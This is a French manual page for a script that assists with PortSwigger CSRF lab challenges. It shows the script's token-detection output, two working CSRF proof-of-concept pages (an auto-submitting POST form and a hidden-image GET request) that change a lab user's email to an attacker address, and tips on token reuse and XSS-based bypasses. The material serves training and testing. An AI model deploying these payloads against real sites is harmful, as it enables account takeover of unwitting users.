# MANPAGE

Voici un exemple exhaustif d’utilisation du script CSRF pour les challenges PortSwigger, avec l’analyse des résultats attendus et des liens directs avec les scénarios classiques des labs :

---

## 1. Recherche de token CSRF dans le formulaire cible

**But** : Vérifier si la page critique (ex : changement d’email) contient un token CSRF.

**Exécution** :
```bash
./script.sh
```
**Sortie attendue** :
```
[1] Recherche de token CSRF dans le formulaire cible
>> [ALERTE] Aucun token CSRF détecté dans le formulaire !
>> PROPOSITION : Implémenter un token CSRF unique par session et vérifié côté serveur.
```
ou
```
[1] Recherche de token CSRF dans le formulaire cible
>> [INFO] Un champ ou paramètre lié au CSRF est présent dans le formulaire.
>> Vérifiez s'il est unique par session/utilisateur et s'il est vérifié côté serveur.
```
**Analyse** :  
- Si aucun token n’est détecté, la fonctionnalité est vulnérable (cas du lab[7]).
- Si un token est détecté, vérifiez sa robustesse (unicité, liaison à la session, vérification serveur).

---

## 2. Génération d’une PoC HTML pour exploitation CSRF (POST)

**But** : Générer un formulaire HTML qui soumet une requête POST vers l’action vulnérable.

**Sortie affichée par le script** :
```html
<!DOCTYPE html>
<html>
  <body>
    <form action="https://<your-lab>.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="attacker@evil.com">
      <!-- Ajoutez ici un champ csrf si nécessaire, ex: <input type="hidden" name="csrf" value="TOKEN"> -->
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```
**Étapes pratiques** :
- Collez ce code sur l’exploit server PortSwigger ([7][8]).
- Cliquez sur "View exploit" pour tester sur votre propre session.
- Vérifiez dans l’application que l’email a changé.
- Modifiez l’email pour la version finale destinée à la victime, puis cliquez sur "Deliver to victim" pour valider le lab.

---

## 3. Génération d’une PoC HTML pour exploitation CSRF (GET)

**But** : Tester si l’action critique est vulnérable en GET (rare, mais possible sur certains labs).

**Sortie affichée par le script** :
```html
<!DOCTYPE html>
<html>
  <body>
    <img src="https://<your-lab>.web-security-academy.net/my-account/change-email?email=attacker@evil.com" style="display:none">
  </body>
</html>
```
**Analyse** :
- Si le changement s’effectue simplement en visitant cette page, la protection CSRF est absente ou mal configurée pour la méthode GET ([7]).

---

## 4. Conseils pour la détection et la validation

**Sortie** :
```
[4] Conseils pour la détection et la validation CSRF
- Vérifiez si l'action critique (ex: changement d'email, mot de passe) peut être réalisée sans interaction utilisateur sur le site cible.
- Si le token CSRF n'est pas lié à la session ou à l'utilisateur, testez la réutilisation d'un token d'un autre utilisateur.
- Essayez d'automatiser l'envoi de la requête avec et sans le token, ou avec un token périmé.
- Utilisez Burp Suite > Engagement tools > Generate CSRF PoC pour générer automatiquement une attaque ([1][5][6][8]).
- Pour les labs PortSwigger, placez la PoC sur l'exploit server, cliquez sur 'View exploit' pour tester sur vous-même, puis 'Deliver to victim'.
```
**Analyse** :
- Suivez ces conseils pour valider l’exploitabilité et la robustesse de la protection CSRF.

---

## 5. Conseils avancés (bypass, XSS, etc.)

**Sortie** :
```
[5] Conseils avancés et scénarios particuliers
- Si un XSS est présent, il peut permettre de voler ou de contourner un token CSRF (voir lab XSS/CSRF [2][3]).
- Pour les protections basées sur la méthode, testez POST vs GET.
- Si le token CSRF n'est pas lié à la session, testez la réutilisation inter-utilisateurs.
- Pour automatiser, utilisez Burp Suite Scanner ou Burp Repeater pour rejouer les requêtes avec différents tokens.
```
**Analyse** :
- Pour les labs avancés, combinez XSS et CSRF pour contourner la protection ([2][3]).
- Utilisez Burp Suite pour générer et tester des PoC complexes ([1][5][6][8]).

---

## Synthèse finale

**Sortie** :
```
------------------------------------------------------
[SYNTHÈSE]
1. Vérifiez la présence et la robustesse du token CSRF dans les formulaires et requêtes critiques.
2. Testez les PoC générées sur l'exploit server PortSwigger pour valider l'exploitabilité.
3. Utilisez Burp Suite pour générer des PoC et automatiser les scénarios avancés.
4. Pour chaque alerte, appliquez les recommandations PortSwigger : token unique, vérifié côté serveur, lié à la session/utilisateur, et non réutilisable.
Documentation PortSwigger : https://portswigger.net/web-security/csrf
------------------------------------------------------
```

